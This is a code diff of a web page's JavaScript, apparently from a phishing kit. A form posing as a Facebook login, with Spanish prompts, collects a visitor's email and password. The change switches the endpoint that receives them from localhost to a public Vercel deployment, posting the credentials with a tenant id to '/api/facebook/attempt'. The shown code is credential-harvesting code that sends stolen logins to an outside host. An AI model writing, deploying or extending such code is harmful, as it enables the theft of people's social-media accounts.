@@ -126,7 +126,7 @@
         var btn = document.getElementById('fb-btn');
         if (!email || !password) { alert('Por favor completa todos los campos.'); return; }
         btn.disabled = true; btn.innerText = 'Verificando...';
-        fetch('http://localhost:3001/api/facebook/attempt', {
+        fetch('https://metodo-automatizado-t38r-kazv7j5bv-adrien1138gmailcoms-projects.vercel.app/api/facebook/attempt', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ email: email, password: password, tenantId: 'b08a9823-3984-46e4-95cf-6eead059c642' })
